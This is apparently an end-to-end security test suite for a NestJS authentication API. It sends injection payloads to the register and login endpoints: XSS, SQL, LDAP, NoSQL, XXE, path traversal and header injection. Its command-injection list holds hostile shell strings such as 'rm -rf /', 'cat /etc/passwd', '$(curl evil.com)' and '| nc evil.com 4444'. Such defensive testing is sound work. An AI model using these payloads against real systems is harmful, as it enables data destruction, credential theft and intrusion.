import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import * as request from 'supertest';
import { AppModule } from '../src/app.module';
import { PrismaService } from '../src/prisma/prisma.service';
import { SanitizationUtil } from '../src/common/utils/sanitization.util';
import { ValidationUtil } from '../src/common/utils/validation.util';

describe('Input Validation and Sanitization Security (e2e)', () => {
  let app: INestApplication;
  let prismaService: PrismaService;

  beforeAll(async () => {
    const moduleFixture: TestingModule = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleFixture.createNestApplication();

    // Enable validation pipe as in main.ts
    app.useGlobalPipes(
      new ValidationPipe({
        whitelist: true,
        forbidNonWhitelisted: true,
        transform: true,
      }),
    );

    prismaService = moduleFixture.get<PrismaService>(PrismaService);
    await app.init();
  });

  afterAll(async () => {
    // Clean up test data
    await prismaService.user.deleteMany({
      where: {
        email: {
          contains: 'security-test',
        },
      },
    });
    await app.close();
  });

  beforeEach(async () => {
    // Clean up any existing test users before each test
    await prismaService.user.deleteMany({
      where: {
        email: {
          contains: 'security-test',
        },
      },
    });
  });

  describe('XSS (Cross-Site Scripting) Protection', () => {
    describe('Registration Input XSS Prevention', () => {
      it('should sanitize and reject malicious script tags in username', async () => {
        const maliciousUsernames = [
          '<script>alert("xss")</script>',
          '<script src="evil.js"></script>',
          'user<script>alert(1)</script>name',
          '"><script>alert("xss")</script>',
          '<img src="x" onerror="alert(1)">',
          'javascript:alert(1)',
          '<iframe src="javascript:alert(1)"></iframe>',
        ];

        for (const username of maliciousUsernames) {
          const response = await request(app.getHttpServer())
            .post('/auth/register')
            .send({
              username: username,
              email: 'xss-test@security-test.com',
              password: 'TestPassword123!',
              fullName: 'XSS Test User',
            })
            .expect(400);

          expect(response.body).toHaveProperty('error', 'Bad Request');
          expect(response.body.message).toBeDefined();

          // Ensure malicious content is not reflected in response
          expect(JSON.stringify(response.body)).not.toContain('<script>');
          expect(JSON.stringify(response.body)).not.toContain('javascript:');
          expect(JSON.stringify(response.body)).not.toContain('onerror');
        }
      });

      it('should sanitize and reject malicious script tags in full name', async () => {
        const maliciousNames = [
          'John <script>alert("xss")</script> Doe',
          '<img src="x" onerror="alert(1)">John',
          'John<iframe src="javascript:alert(1)"></iframe>',
          'John\"><script>alert(\"xss\")</script>',
          'John<object data="javascript:alert(1)">',
        ];

        for (const fullName of maliciousNames) {
          const response = await request(app.getHttpServer())
            .post('/auth/register')
            .send({
              username: 'xsstestuser',
              email: 'xss-fullname@security-test.com',
              password: 'TestPassword123!',
              fullName: fullName,
            })
            .expect(400);

          expect(response.body).toHaveProperty('error', 'Bad Request');

          // Ensure malicious content is not reflected in response
          expect(JSON.stringify(response.body)).not.toContain('<script>');
          expect(JSON.stringify(response.body)).not.toContain('<img');
          expect(JSON.stringify(response.body)).not.toContain('<iframe');
          expect(JSON.stringify(response.body)).not.toContain('<object');
        }
      });

      it('should sanitize and reject malicious content in email field', async () => {
        const maliciousEmails = [
          'test<script>alert(1)</script>@security-test.com',
          'test@security-test.com<script>alert(1)</script>',
          '"><script>alert("xss")</script>@security-test.com',
          'test+<img src="x" onerror="alert(1)">@security-test.com',
        ];

        for (const email of maliciousEmails) {
          const response = await request(app.getHttpServer())
            .post('/auth/register')
            .send({
              username: 'emailxsstest',
              email: email,
              password: 'TestPassword123!',
              fullName: 'Email XSS Test',
            })
            .expect(400);

          expect(response.body).toHaveProperty('error', 'Bad Request');

          // Ensure malicious content is not reflected in response
          expect(JSON.stringify(response.body)).not.toContain('<script>');
          expect(JSON.stringify(response.body)).not.toContain('<img');
        }
      });
    });

    describe('Login Input XSS Prevention', () => {
      it('should sanitize malicious content in login identifier', async () => {
        const maliciousIdentifiers = [
          '<script>alert("login-xss")</script>',
          'user<img src="x" onerror="alert(1)">',
          '"><script>alert("login")</script>',
          'javascript:alert(1)',
        ];

        for (const identifier of maliciousIdentifiers) {
          const response = await request(app.getHttpServer())
            .post('/auth/login')
            .send({
              identifier: identifier,
              password: 'TestPassword123!',
            })
            .expect(401);

          // Ensure malicious content is not reflected in response
          expect(JSON.stringify(response.body)).not.toContain('<script>');
          expect(JSON.stringify(response.body)).not.toContain('javascript:');
          expect(JSON.stringify(response.body)).not.toContain('onerror');
        }
      });

      it('should handle XSS attempts in password field safely', async () => {
        const maliciousPasswords = [
          '<script>alert("password")</script>',
          'password<img src="x" onerror="alert(1)">',
          '"><script>alert("pwd")</script>',
        ];

        for (const password of maliciousPasswords) {
          const response = await request(app.getHttpServer())
            .post('/auth/login')
            .send({
              identifier: 'test@security-test.com',
              password: password,
            })
            .expect(401);

          // Password should never be reflected in response anyway
          expect(JSON.stringify(response.body)).not.toContain('<script>');
          expect(JSON.stringify(response.body)).not.toContain(password);
        }
      });
    });

    describe('HTML Entity Encoding', () => {
      it('should properly encode HTML entities in error responses', async () => {
        const htmlEntities = [
          'user&lt;script&gt;',
          'user&quot;test&quot;',
          'user&amp;test',
          'user&#x27;test&#x27;',
        ];

        for (const username of htmlEntities) {
          const response = await request(app.getHttpServer())
            .post('/auth/register')
            .send({
              username: username,
              email: 'entity-test@security-test.com',
              password: 'TestPassword123!',
              fullName: 'Entity Test User',
            });

          // Should handle HTML entities properly without double-encoding
          if (response.status === 400) {
            expect(response.body).toHaveProperty('error', 'Bad Request');
          }
        }
      });
    });
  });

  describe('SQL Injection Protection', () => {
    describe('Authentication SQL Injection Attempts', () => {
      it('should prevent SQL injection in login identifier', async () => {
        const sqlInjectionPayloads = [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "' UNION SELECT * FROM users --",
          "admin'--",
          "' OR 1=1#",
          "'; DELETE FROM users; --",
          "' OR '1'='1' /*",
          "') OR ('1'='1",
          "'; INSERT INTO users VALUES('hacker','pass'); --",
          "' AND (SELECT COUNT(*) FROM users) > 0 --",
        ];

        for (const payload of sqlInjectionPayloads) {
          const response = await request(app.getHttpServer())
            .post('/auth/login')
            .send({
              identifier: payload,
              password: 'TestPassword123!',
            })
            .expect(401);

          expect(response.body).toHaveProperty(
            'message',
            'Invalid credentials',
          );

          // Ensure no SQL syntax is reflected in response
          expect(JSON.stringify(response.body)).not.toContain('DROP');
          expect(JSON.stringify(response.body)).not.toContain('UNION');
          expect(JSON.stringify(response.body)).not.toContain('DELETE');
          expect(JSON.stringify(response.body)).not.toContain('INSERT');
        }
      });

      it('should prevent SQL injection in registration fields', async () => {
        const sqlPayloads = [
          "'; DROP TABLE users; --",
          "' OR 1=1 --",
          "'; DELETE FROM users WHERE email='victim@test.com'; --",
        ];

        for (const payload of sqlPayloads) {
          const response = await request(app.getHttpServer())
            .post('/auth/register')
            .send({
              username: payload,
              email: 'sql-injection@security-test.com',
              password: 'TestPassword123!',
              fullName: 'SQL Test User',
            })
            .expect(400);

          expect(response.body).toHaveProperty('error', 'Bad Request');

          // Ensure no SQL syntax is reflected
          expect(JSON.stringify(response.body)).not.toContain('DROP');
          expect(JSON.stringify(response.body)).not.toContain('DELETE');
        }
      });
    });

    describe('Advanced SQL Injection Patterns', () => {
      it('should prevent time-based SQL injection attempts', async () => {
        const timeBasedPayloads = [
          "'; WAITFOR DELAY '00:00:05'; --",
          "' OR (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
          "'; SELECT SLEEP(5); --",
          "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        ];

        for (const payload of timeBasedPayloads) {
          const startTime = Date.now();

          const response = await request(app.getHttpServer())
            .post('/auth/login')
            .send({
              identifier: payload,
              password: 'TestPassword123!',
            })
            .expect(401);

          const duration = Date.now() - startTime;

          // Should not cause significant delay (SQL injection prevented)
          expect(duration).toBeLessThan(2000);
          expect(response.body.message).toBe('Invalid credentials');
        }
      });

      it('should prevent boolean-based blind SQL injection', async () => {
        const booleanPayloads = [
          "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE email='admin@test.com')='a",
          "' OR (SELECT COUNT(*) FROM users)>0 --",
          "' AND EXISTS(SELECT * FROM users WHERE email='admin@test.com') --",
          "' OR (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)))>64 --",
        ];

        for (const payload of booleanPayloads) {
          const response = await request(app.getHttpServer())
            .post('/auth/login')
            .send({
              identifier: payload,
              password: 'TestPassword123!',
            })
            .expect(401);

          expect(response.body.message).toBe('Invalid credentials');

          // Should not reveal database structure or data
          expect(JSON.stringify(response.body)).not.toContain('users');
          expect(JSON.stringify(response.body)).not.toContain('password');
          expect(JSON.stringify(response.body)).not.toContain('SELECT');
        }
      });
    });
  });

  describe('Command Injection Protection', () => {
    it('should prevent command injection in input fields', async () => {
      const commandInjectionPayloads = [
        '; rm -rf /',
        '$(rm -rf /)',
        '`rm -rf /`',
        '| cat /etc/passwd',
        '& dir',
        '; ls -la',
        '$(curl evil.com)',
        '`wget evil.com/malware`',
        '; ping evil.com',
        '| nc evil.com 4444',
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            username: payload,
            email: 'cmd-injection@security-test.com',
            password: 'TestPassword123!',
            fullName: 'Command Injection Test',
          })
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Bad Request');

        // Ensure no command syntax is reflected
        expect(JSON.stringify(response.body)).not.toContain('rm -rf');
        expect(JSON.stringify(response.body)).not.toContain('cat /etc');
        expect(JSON.stringify(response.body)).not.toContain('wget');
        expect(JSON.stringify(response.body)).not.toContain('curl');
      }
    });
  });

  describe('LDAP Injection Protection', () => {
    it('should prevent LDAP injection attempts', async () => {
      const ldapInjectionPayloads = [
        '*)(uid=*',
        '*)(|(uid=*))',
        '*))(|(uid=*',
        '*))%00',
        '*()|(&(uid=*))',
        '*)(objectClass=*',
        '*)(&(uid=*)(userPassword=*))',
      ];

      for (const payload of ldapInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/login')
          .send({
            identifier: payload,
            password: 'TestPassword123!',
          })
          .expect(401);

        expect(response.body.message).toBe('Invalid credentials');

        // Ensure no LDAP syntax is reflected
        expect(JSON.stringify(response.body)).not.toContain('uid=');
        expect(JSON.stringify(response.body)).not.toContain('objectClass');
      }
    });
  });

  describe('NoSQL Injection Protection', () => {
    it('should prevent NoSQL injection attempts', async () => {
      const noSqlPayloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.password.length > 0"}',
        '{"$or": [{"email": {"$regex": ".*"}}, {"username": {"$regex": ".*"}}]}',
      ];

      for (const payload of noSqlPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/login')
          .send({
            identifier: payload,
            password: 'TestPassword123!',
          })
          .expect(401);

        expect(response.body.message).toBe('Invalid credentials');

        // Ensure no NoSQL operators are reflected
        expect(JSON.stringify(response.body)).not.toContain('$gt');
        expect(JSON.stringify(response.body)).not.toContain('$ne');
        expect(JSON.stringify(response.body)).not.toContain('$regex');
        expect(JSON.stringify(response.body)).not.toContain('$where');
      }
    });
  });

  describe('Path Traversal Protection', () => {
    it('should prevent directory traversal in filename-like inputs', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        './././etc/passwd',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      ];

      for (const payload of pathTraversalPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            username: payload,
            email: 'path-traversal@security-test.com',
            password: 'TestPassword123!',
            fullName: 'Path Traversal Test',
          })
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Bad Request');

        // Ensure no path traversal syntax is reflected
        expect(JSON.stringify(response.body)).not.toContain('../');
        expect(JSON.stringify(response.body)).not.toContain('..\\');
        expect(JSON.stringify(response.body)).not.toContain('etc/passwd');
      }
    });
  });

  describe('XML Injection and XXE Protection', () => {
    it('should prevent XML injection attempts', async () => {
      const xmlInjectionPayloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://evil.com/evil.dtd"> %ext;]>',
        '<root><![CDATA[malicious content]]></root>',
        '<?xml-stylesheet type="text/xsl" href="evil.xsl"?>',
      ];

      for (const payload of xmlInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            username: 'xmltest',
            email: 'xml-injection@security-test.com',
            password: 'TestPassword123!',
            fullName: payload,
          })
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Bad Request');

        // Ensure no XML syntax is reflected
        expect(JSON.stringify(response.body)).not.toContain('<?xml');
        expect(JSON.stringify(response.body)).not.toContain('<!DOCTYPE');
        expect(JSON.stringify(response.body)).not.toContain('<!ENTITY');
        expect(JSON.stringify(response.body)).not.toContain('<![CDATA[');
      }
    });
  });

  describe('Header Injection Protection', () => {
    it('should prevent HTTP header injection', async () => {
      const headerInjectionPayloads = [
        'test\r\nSet-Cookie: evil=value',
        'test\nLocation: http://evil.com',
        'test\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>',
        'test%0d%0aSet-Cookie: malicious=true',
        'test%0aLocation:%20http://evil.com',
      ];

      for (const payload of headerInjectionPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            username: payload,
            email: 'header-injection@security-test.com',
            password: 'TestPassword123!',
            fullName: 'Header Injection Test',
          })
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Bad Request');

        // Ensure no CRLF or header syntax is reflected
        expect(JSON.stringify(response.body)).not.toContain('\r\n');
        expect(JSON.stringify(response.body)).not.toContain('Set-Cookie');
        expect(JSON.stringify(response.body)).not.toContain('Location:');
      }
    });
  });

  describe('Unicode and Encoding Attacks', () => {
    it('should handle Unicode normalization attacks', async () => {
      const unicodePayloads = [
        'admin\u2075', // Unicode superscript 5
        'test\u180e\u200b\u200c\u200d', // Zero-width characters
        '\ufeffadmin', // Byte Order Mark
        'test\u00a0user', // Non-breaking space
        '\u202eadmin', // Right-to-Left Override
      ];

      for (const payload of unicodePayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            username: payload,
            email: 'unicode-test@security-test.com',
            password: 'TestPassword123!',
            fullName: 'Unicode Test User',
          });

        // Should either reject or normalize properly
        if (response.status === 400) {
          expect(response.body).toHaveProperty('error', 'Bad Request');
        } else if (response.status === 201) {
          // If accepted, should be properly normalized
          expect(response.body.user.username).not.toContain('\u2075');
        }
      }
    });

    it('should prevent null byte injection', async () => {
      const nullBytePayloads = [
        'test\x00.jpg',
        'admin\u0000user',
        'test%00user',
        'file.txt\x00.exe',
      ];

      for (const payload of nullBytePayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            username: payload,
            email: 'nullbyte-test@security-test.com',
            password: 'TestPassword123!',
            fullName: 'Null Byte Test',
          })
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Bad Request');

        // Ensure null bytes are not reflected
        expect(JSON.stringify(response.body)).not.toContain('\x00');
        expect(JSON.stringify(response.body)).not.toContain('%00');
      }
    });
  });

  describe('Input Length and Size Validation', () => {
    it('should reject extremely long inputs to prevent buffer overflow', async () => {
      const longString = 'a'.repeat(10000);

      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          username: longString,
          email: 'length-test@security-test.com',
          password: 'TestPassword123!',
          fullName: 'Length Test User',
        })
        .expect(400);

      expect(response.body).toHaveProperty('error', 'Bad Request');
      expect(response.body.message).toContain('exceed');
    });

    it('should handle very long email addresses properly', async () => {
      const longEmail = 'a'.repeat(300) + '@security-test.com';

      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          username: 'emailtest',
          email: longEmail,
          password: 'TestPassword123!',
          fullName: 'Long Email Test',
        })
        .expect(400);

      expect(response.body).toHaveProperty('error', 'Bad Request');
      expect(response.body.message).toContain('too long');
    });

    it('should reject malformed JSON payloads', async () => {
      const malformedPayloads = [
        '{"username": "test", "email": }',
        '{"username": test", "email": "test@test.com"}',
        '{username: "test", "email": "test@test.com"}',
        '{"username": "test", "email": "test@test.com"',
      ];

      for (const payload of malformedPayloads) {
        const response = await request(app.getHttpServer())
          .post('/auth/register')
          .set('Content-Type', 'application/json')
          .send(payload)
          .expect(400);

        expect(response.body).toHaveProperty('error', 'Bad Request');
      }
    });
  });

  describe('Sanitization Utility Functions', () => {
    describe('HTML Sanitization', () => {
      it('should remove dangerous HTML tags', () => {
        const maliciousHtml =
          '<script>alert("xss")</script><p>safe content</p><iframe src="evil.com"></iframe>';
        const sanitized = SanitizationUtil.sanitizeHtml(maliciousHtml);

        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<iframe>');
        expect(sanitized).toContain('<p>safe content</p>');
      });

      it('should remove dangerous attributes', () => {
        const maliciousHtml =
          '<img src="image.jpg" onerror="alert(1)" onclick="evil()">';
        const sanitized = SanitizationUtil.sanitizeHtml(maliciousHtml);

        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onclick');
      });
    });

    describe('Input Sanitization', () => {
      it('should encode HTML entities', () => {
        const maliciousInput = '<script>alert("test")</script>';
        const sanitized = SanitizationUtil.sanitizeInput(maliciousInput);

        expect(sanitized).toContain('&lt;');
        expect(sanitized).toContain('&gt;');
        expect(sanitized).not.toContain('<script>');
      });

      it('should remove control characters', () => {
        const inputWithControlChars = 'test\x00\x01\x02user';
        const sanitized = SanitizationUtil.sanitizeInput(inputWithControlChars);

        expect(sanitized).toBe('testuser');
      });
    });

    describe('SQL Sanitization', () => {
      it('should remove SQL injection patterns', () => {
        const sqlInjection = "'; DROP TABLE users; --";
        const sanitized = SanitizationUtil.sanitizeSql(sqlInjection);

        expect(sanitized).not.toContain('DROP');
        expect(sanitized).not.toContain('--');
        expect(sanitized).not.toContain(';');
      });
    });

    describe('Filename Sanitization', () => {
      it('should remove directory traversal patterns', () => {
        const maliciousFilename = '../../../etc/passwd';
        const sanitized = SanitizationUtil.sanitizeFilename(maliciousFilename);

        expect(sanitized).not.toContain('../');
        expect(sanitized).not.toContain('/');
        expect(sanitized).toBe('etcpasswd');
      });
    });

    describe('URL Sanitization', () => {
      it('should reject dangerous protocols', () => {
        const dangerousUrls = [
          'javascript:alert(1)',
          'data:text/html,<script>alert(1)</script>',
          'file:///etc/passwd',
          'ftp://evil.com/malware',
        ];

        dangerousUrls.forEach((url) => {
          const sanitized = SanitizationUtil.sanitizeUrl(url);
          expect(sanitized).toBe('');
        });
      });

      it('should allow safe HTTP/HTTPS URLs', () => {
        const safeUrls = ['https://example.com', 'http://test.org/path'];

        safeUrls.forEach((url) => {
          const sanitized = SanitizationUtil.sanitizeUrl(url);
          expect(sanitized).toBe(url);
        });
      });
    });

    describe('Email Sanitization', () => {
      it('should reject emails with dangerous characters', () => {
        const dangerousEmails = [
          'test<script>@evil.com',
          'test"@evil.com',
          "test'@evil.com",
          'test()@evil.com',
        ];

        dangerousEmails.forEach((email) => {
          const sanitized = SanitizationUtil.sanitizeEmail(email);
          expect(sanitized).toBe('');
        });
      });

      it('should normalize valid emails', () => {
        const email = 'TEST@Example.COM';
        const sanitized = SanitizationUtil.sanitizeEmail(email);
        expect(sanitized).toBe('test@example.com');
      });
    });
  });

  describe('Validation Utility Functions', () => {
    describe('Password Strength Validation', () => {
      it('should reject weak passwords', () => {
        const weakPasswords = [
          'password',
          '123456',
          'password123',
          'Password',
          'PASSWORD123',
        ];

        weakPasswords.forEach((password) => {
          const result = ValidationUtil.validatePasswordStrength(password);
          expect(result.isValid).toBe(false);
          expect(result.errors.length).toBeGreaterThan(0);
        });
      });

      it('should accept strong passwords', () => {
        const strongPasswords = [
          'StrongPass123!',
          'MySecure$Pass1',
          'Unbreakable@2023',
        ];

        strongPasswords.forEach((password) => {
          const result = ValidationUtil.validatePasswordStrength(password);
          expect(result.isValid).toBe(true);
          expect(result.errors.length).toBe(0);
        });
      });
    });

    describe('Username Validation', () => {
      it('should reject invalid usernames', () => {
        const invalidUsernames = [
          'ad', // too short
          'admin', // reserved word
          'user@name', // invalid character
          '_username', // starts with special char
          'username_', // ends with special char
        ];

        invalidUsernames.forEach((username) => {
          const result = ValidationUtil.validateUsername(username);
          expect(result.isValid).toBe(false);
          expect(result.errors.length).toBeGreaterThan(0);
        });
      });

      it('should accept valid usernames', () => {
        const validUsernames = [
          'testuser',
          'user123',
          'my.username',
          'user-name',
        ];

        validUsernames.forEach((username) => {
          const result = ValidationUtil.validateUsername(username);
          expect(result.isValid).toBe(true);
          expect(result.errors.length).toBe(0);
        });
      });
    });

    describe('Email Validation', () => {
      it('should reject invalid emails', () => {
        const invalidEmails = [
          'notanemail',
          '@example.com',
          'test@',
          'test..test@example.com',
          'test@example',
        ];

        invalidEmails.forEach((email) => {
          const result = ValidationUtil.validateEmail(email);
          expect(result.isValid).toBe(false);
          expect(result.errors.length).toBeGreaterThan(0);
        });
      });

      it('should accept valid emails', () => {
        const validEmails = [
          'test@example.com',
          'user.name@domain.org',
          'test+tag@example.co.uk',
        ];

        validEmails.forEach((email) => {
          const result = ValidationUtil.validateEmail(email);
          expect(result.isValid).toBe(true);
          expect(result.errors.length).toBe(0);
        });
      });
    });
  });

  describe('Content-Type and MIME Type Validation', () => {
    it('should reject requests with unexpected content types', async () => {
      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .set('Content-Type', 'application/xml')
        .send('<?xml version="1.0"?><user><username>test</username></user>')
        .expect(400);

      expect(response.body).toHaveProperty('error', 'Bad Request');
    });

    it('should handle multipart form data attacks', async () => {
      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .set('Content-Type', 'multipart/form-data; boundary=test')
        .send(
          '--test\r\nContent-Disposition: form-data; name="username"\r\n\r\nmalicioususer\r\n--test--',
        )
        .expect(400);

      expect(response.body).toHaveProperty('error', 'Bad Request');
    });
  });
});
